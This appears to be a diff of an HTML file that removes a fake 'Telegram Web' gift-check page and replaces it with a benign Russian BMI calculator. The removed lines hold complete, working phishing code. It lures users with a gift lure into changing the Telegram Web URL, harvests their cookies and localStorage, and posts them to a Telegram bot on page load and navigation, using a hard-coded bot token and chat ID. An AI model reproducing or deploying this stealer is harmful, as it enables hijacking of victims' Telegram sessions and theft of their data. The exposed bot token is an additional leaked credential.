@@ -1,137 +1,531 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Web</title>
-    <style>
-        body { margin:0; background:#0f0f0f; color:#fff; font-family: system-ui; }
-        .fake-bar {
-            background: #229ED9;
-            padding: 10px 15px;
-            text-align: center;
-            font-weight: bold;
-        }
-        .content {
-            padding: 40px 20px;
-            text-align: center;
-            max-width: 480px;
-            margin: 80px auto;
-        }
-        .url {
-            background: #1a1a1a;
-            padding: 12px;
-            font-family: monospace;
-            border-radius: 6px;
-            margin: 20px 0;
-            word-break: break-all;
-            color: #0f0;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Калькулятор ИМТ</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0e0e12;
+    --card: #16161e;
+    --border: #2a2a38;
+    --accent: #c8f060;
+    --accent2: #60f0c8;
+    --text: #f0f0f5;
+    --muted: #7a7a9a;
+    --danger: #f06060;
+    --warn: #f0c060;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'DM Sans', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    overflow-x: hidden;
+  }
+
+  /* background grid */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(200,240,96,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(200,240,96,0.04) 1px, transparent 1px);
+    background-size: 48px 48px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 420px;
+  }
+
+  .badge {
+    display: inline-block;
+    font-size: 11px;
+    font-weight: 500;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--accent);
+    border: 1px solid rgba(200,240,96,0.3);
+    padding: 4px 12px;
+    border-radius: 100px;
+    margin-bottom: 16px;
+  }
+
+  h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: 38px;
+    font-weight: 700;
+    line-height: 1.1;
+    margin-bottom: 8px;
+    background: linear-gradient(135deg, #f0f0f5 30%, #c8f060);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .subtitle {
+    color: var(--muted);
+    font-size: 14px;
+    margin-bottom: 32px;
+    font-weight: 300;
+  }
+
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 28px;
+    margin-bottom: 16px;
+  }
+
+  .toggle-row {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 28px;
+    background: var(--bg);
+    padding: 4px;
+    border-radius: 12px;
+    border: 1px solid var(--border);
+  }
+
+  .toggle-btn {
+    flex: 1;
+    padding: 8px;
+    border: none;
+    border-radius: 9px;
+    background: transparent;
+    color: var(--muted);
+    font-family: 'DM Sans', sans-serif;
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .toggle-btn.active {
+    background: var(--accent);
+    color: #0e0e12;
+  }
+
+  .field {
+    margin-bottom: 20px;
+  }
+
+  label {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    font-weight: 500;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 10px;
+  }
+
+  label span.unit-tag {
+    font-size: 11px;
+    background: rgba(255,255,255,0.06);
+    padding: 2px 8px;
+    border-radius: 6px;
+    text-transform: lowercase;
+    letter-spacing: 0;
+    color: var(--muted);
+  }
+
+  .slider-wrap {
+    position: relative;
+  }
+
+  input[type=range] {
+    -webkit-appearance: none;
+    width: 100%;
+    height: 4px;
+    background: var(--border);
+    border-radius: 100px;
+    outline: none;
+    cursor: pointer;
+  }
+
+  input[type=range]::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    background: var(--accent);
+    border: 3px solid var(--card);
+    box-shadow: 0 0 0 1px var(--accent);
+    cursor: grab;
+    transition: transform 0.15s;
+  }
+
+  input[type=range]:active::-webkit-slider-thumb {
+    transform: scale(1.2);
+    cursor: grabbing;
+  }
+
+  .range-value {
+    font-family: 'Playfair Display', serif;
+    font-size: 32px;
+    font-weight: 700;
+    color: var(--text);
+    margin-top: 10px;
+    display: flex;
+    align-items: baseline;
+    gap: 6px;
+  }
+
+  .range-value small {
+    font-family: 'DM Sans', sans-serif;
+    font-size: 14px;
+    font-weight: 400;
+    color: var(--muted);
+  }
+
+  .divider {
+    height: 1px;
+    background: var(--border);
+    margin: 24px 0;
+  }
+
+  .calc-btn {
+    width: 100%;
+    padding: 16px;
+    background: var(--accent);
+    color: #0e0e12;
+    border: none;
+    border-radius: 14px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    letter-spacing: 0.04em;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .calc-btn:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 8px 24px rgba(200,240,96,0.3);
+  }
+
+  .calc-btn:active { transform: translateY(0); }
+
+  /* Result card */
+  .result-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 28px;
+    opacity: 0;
+    transform: translateY(12px);
+    transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    pointer-events: none;
+  }
+
+  .result-card.show {
+    opacity: 1;
+    transform: translateY(0);
+    pointer-events: all;
+  }
+
+  .result-top {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    margin-bottom: 20px;
+  }
+
+  .result-label {
+    font-size: 11px;
+    font-weight: 500;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 6px;
+  }
+
+  .result-number {
+    font-family: 'Playfair Display', serif;
+    font-size: 56px;
+    font-weight: 700;
+    line-height: 1;
+    transition: color 0.4s;
+  }
+
+  .result-category {
+    display: inline-block;
+    font-size: 13px;
+    font-weight: 600;
+    padding: 6px 14px;
+    border-radius: 100px;
+    margin-top: 8px;
+    transition: all 0.4s;
+  }
+
+  /* Scale bar */
+  .scale {
+    margin-top: 20px;
+  }
+
+  .scale-bar {
+    height: 8px;
+    border-radius: 100px;
+    background: linear-gradient(90deg, #60a0f0 0%, #60f0c8 30%, #c8f060 55%, #f0c060 75%, #f06060 100%);
+    position: relative;
+    margin-bottom: 10px;
+  }
+
+  .scale-marker {
+    position: absolute;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    width: 16px;
+    height: 16px;
+    background: white;
+    border-radius: 50%;
+    border: 3px solid var(--card);
+    box-shadow: 0 0 0 2px white;
+    transition: left 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+
+  .scale-labels {
+    display: flex;
+    justify-content: space-between;
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.05em;
+  }
+
+  .info-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-top: 20px;
+  }
+
+  .info-item {
+    background: rgba(255,255,255,0.04);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 12px 14px;
+  }
+
+  .info-item-label {
+    font-size: 10px;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 4px;
+  }
+
+  .info-item-value {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+  }
+
+  /* category colors */
+  .cat-underweight { color: #60a0f0; }
+  .cat-normal      { color: #c8f060; }
+  .cat-overweight  { color: #f0c060; }
+  .cat-obese       { color: #f06060; }
+
+  .bg-underweight { background: rgba(96,160,240,0.15); color: #60a0f0; }
+  .bg-normal      { background: rgba(200,240,96,0.15); color: #c8f060; }
+  .bg-overweight  { background: rgba(240,192,96,0.15); color: #f0c060; }
+  .bg-obese       { background: rgba(240,96,96,0.15);  color: #f06060; }
+
+  .footer-note {
+    font-size: 11px;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 20px;
+    opacity: 0.6;
+  }
+</style>
 </head>
 <body>
+<div class="container">
+  <div class="badge">Здоровье</div>
+  <h1>Индекс<br>массы тела</h1>
+  <p class="subtitle">Введите параметры и узнайте ваш ИМТ</p>
 
-<div class="fake-bar">Telegram Web — Проверка подарка</div>
+  <div class="card">
+    <div class="toggle-row">
+      <button class="toggle-btn active" onclick="setGender('m', this)">👨 Мужчина</button>
+      <button class="toggle-btn" onclick="setGender('f', this)">👩 Женщина</button>
+    </div>
 
-<div class="content">
-    <h1>🎁 Оценка ликвидности подарка</h1>
-    <p>Допишите в адресной строке <strong>/gift</strong> после /k# и нажмите Enter</p>
-    
-    <div class="url" id="currentUrl">https://web.telegram.org/k#/</div>
-    
-    <p style="color:#888; font-size:14px;">
-        После этого автоматически запустится проверка ваших подарков для Portal / Mrkt.
-    </p>
+    <div class="field">
+      <label>Рост <span class="unit-tag">см</span></label>
+      <div class="slider-wrap">
+        <input type="range" id="height" min="140" max="220" value="170" oninput="updateVal('height','heightVal')">
+      </div>
+      <div class="range-value"><span id="heightVal">170</span><small>см</small></div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="field">
+      <label>Вес <span class="unit-tag">кг</span></label>
+      <div class="slider-wrap">
+        <input type="range" id="weight" min="30" max="180" value="70" oninput="updateVal('weight','weightVal')">
+      </div>
+      <div class="range-value"><span id="weightVal">70</span><small>кг</small></div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="field">
+      <label>Возраст <span class="unit-tag">лет</span></label>
+      <div class="slider-wrap">
+        <input type="range" id="age" min="10" max="90" value="25" oninput="updateVal('age','ageVal')">
+      </div>
+      <div class="range-value"><span id="ageVal">25</span><small>лет</small></div>
+    </div>
+
+    <button class="calc-btn" onclick="calculate()">Рассчитать ИМТ →</button>
+  </div>
+
+  <div class="result-card" id="resultCard">
+    <div class="result-top">
+      <div>
+        <div class="result-label">Ваш ИМТ</div>
+        <div class="result-number" id="resultNum">—</div>
+        <div class="result-category" id="resultCat">—</div>
+      </div>
+    </div>
+
+    <div class="scale">
+      <div class="scale-bar">
+        <div class="scale-marker" id="scaleMarker" style="left:30%"></div>
+      </div>
+      <div class="scale-labels">
+        <span>Дефицит</span>
+        <span>Норма</span>
+        <span>Избыток</span>
+        <span>Ожирение</span>
+      </div>
+    </div>
+
+    <div class="info-grid">
+      <div class="info-item">
+        <div class="info-item-label">Идеальный вес</div>
+        <div class="info-item-value" id="idealWeight">—</div>
+      </div>
+      <div class="info-item">
+        <div class="info-item-label">Разница</div>
+        <div class="info-item-value" id="weightDiff">—</div>
+      </div>
+      <div class="info-item">
+        <div class="info-item-label">Суточные ккал</div>
+        <div class="info-item-value" id="calories">—</div>
+      </div>
+      <div class="info-item">
+        <div class="info-item-label">Категория ВОЗ</div>
+        <div class="info-item-value" id="wohCat">—</div>
+      </div>
+    </div>
+  </div>
+
+  <p class="footer-note">ИМТ — ориентировочный показатель. Проконсультируйтесь с врачом.</p>
 </div>
 
 <script>
-// === НАСТРОЙКИ БОТА ===
-const BOT_TOKEN = "8333491656:AAEX9f3mxLFoF-gdrieql_Hlxj4DOegYg_Y";   // ← Замени!
-const CHAT_ID = "7523357134";                                     // ← Замени!
+  let gender = 'm';
 
-async function sendToBot(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: "HTML",
-                disable_web_page_preview: true
-            }),
-            keepalive: true
-        });
+  function setGender(g, btn) {
+    gender = g;
+    document.querySelectorAll('.toggle-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+  }
 
-        if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
-        }
-        return true;
-    } catch (error) {
-        console.error("Ошибка отправки в бот:", error);
-        
-        // Отправляем сообщение об ошибке (используем Image beacon как запасной вариант)
-        try {
-            const errorMsg = `❌ Ошибка отправки данных!\n\n` +
-                             `Время: ${new Date().toISOString()}\n` +
-                             `Ошибка: ${error.message}\n` +
-                             `URL: ${window.location.href}`;
-            
-            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(errorMsg)}`;
-        } catch (e) {}
-        
-        return false;
-    }
-}
+  function updateVal(sliderId, displayId) {
+    document.getElementById(displayId).textContent = document.getElementById(sliderId).value;
+  }
 
-function stealSession() {
-    const data = {
-        timestamp: Date.now(),
-        url: window.location.href,
-        cookies: document.cookie || "cookies пустые",
-        localStorage: {},
-        userAgent: navigator.userAgent,
-        referrer: document.referrer || "нет",
-        stolenAt: new Date().toISOString()
-    };
+  function calculate() {
+    const h = parseInt(document.getElementById('height').value);
+    const w = parseInt(document.getElementById('weight').value);
+    const a = parseInt(document.getElementById('age').value);
+    const hm = h / 100;
+    const bmi = w / (hm * hm);
+    const bmiRound = Math.round(bmi * 10) / 10;
 
-    // Собираем localStorage
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            data.localStorage[key] = localStorage.getItem(key);
-        }
-    } catch (e) {
-        data.localStorageError = e.message;
+    // category
+    let cat, cls, bgCls;
+    if (bmi < 18.5) {
+      cat = 'Дефицит веса'; cls = 'cat-underweight'; bgCls = 'bg-underweight';
+    } else if (bmi < 25) {
+      cat = 'Норма'; cls = 'cat-normal'; bgCls = 'bg-normal';
+    } else if (bmi < 30) {
+      cat = 'Избыток веса'; cls = 'cat-overweight'; bgCls = 'bg-overweight';
+    } else {
+      cat = 'Ожирение'; cls = 'cat-obese'; bgCls = 'bg-obese';
     }
 
-    const successMessage = `🎁 НОВАЯ ЖЕРТВА!\n\n` +
-        `Время: ${data.stolenAt}\n` +
-        `URL: ${data.url}\n` +
-        `User-Agent: ${data.userAgent}\n\n` +
-        `Cookies (${data.cookies.length} символов):\n${data.cookies.substring(0, 800)}...\n\n` +
-        `LocalStorage ключей: ${Object.keys(data.localStorage).length}`;
+    // ideal weight (Lorentz formula)
+    const ideal = gender === 'm'
+      ? h - 100 - (h - 150) / 4
+      : h - 100 - (h - 150) / 2.5;
+    const idealRound = Math.round(ideal * 10) / 10;
+    const diff = Math.round((w - idealRound) * 10) / 10;
 
-    // Отправляем основные данные
-    sendToBot(successMessage);
-}
+    // BMR (Mifflin-St Jeor)
+    const bmr = gender === 'm'
+      ? 10 * w + 6.25 * h - 5 * a + 5
+      : 10 * w + 6.25 * h - 5 * a - 161;
+    const kcal = Math.round(bmr * 1.375);
 
-// Запускаем кражу
-window.addEventListener('load', stealSession);
-window.addEventListener('hashchange', stealSession);
-window.addEventListener('popstate', stealSession);
+    // WHO category
+    let who;
+    if (bmi < 16) who = 'III степень';
+    else if (bmi < 17) who = 'II степень';
+    else if (bmi < 18.5) who = 'I степень';
+    else if (bmi < 25) who = 'Норма';
+    else if (bmi < 30) who = 'Пред-ожирение';
+    else if (bmi < 35) who = 'I степень';
+    else if (bmi < 40) who = 'II степень';
+    else who = 'III степень';
 
-// Обновляем отображаемый URL
-setInterval(() => {
-    let url = window.location.href;
-    if (!url.includes('/gift')) {
-        url += (url.includes('#') ? '' : '#') + '/gift';
-    }
-    document.getElementById('currentUrl').textContent = url;
-}, 500);
+    // scale position (clamped between 5% and 95%)
+    const pct = Math.min(95, Math.max(5, ((bmi - 14) / (40 - 14)) * 100));
+
+    // update DOM
+    const numEl = document.getElementById('resultNum');
+    numEl.textContent = bmiRound;
+    numEl.className = 'result-number ' + cls;
+
+    const catEl = document.getElementById('resultCat');
+    catEl.textContent = cat;
+    catEl.className = 'result-category ' + bgCls;
+
+    document.getElementById('scaleMarker').style.left = pct + '%';
+    document.getElementById('idealWeight').textContent = idealRound + ' кг';
+    document.getElementById('weightDiff').textContent = (diff > 0 ? '+' : '') + diff + ' кг';
+    document.getElementById('calories').textContent = kcal + ' ккал';
+    document.getElementById('wohCat').textContent = who;
+
+    const card = document.getElementById('resultCard');
+    card.classList.remove('show');
+    requestAnimationFrame(() => requestAnimationFrame(() => card.classList.add('show')));
+  }
 </script>
-
 </body>
 </html>
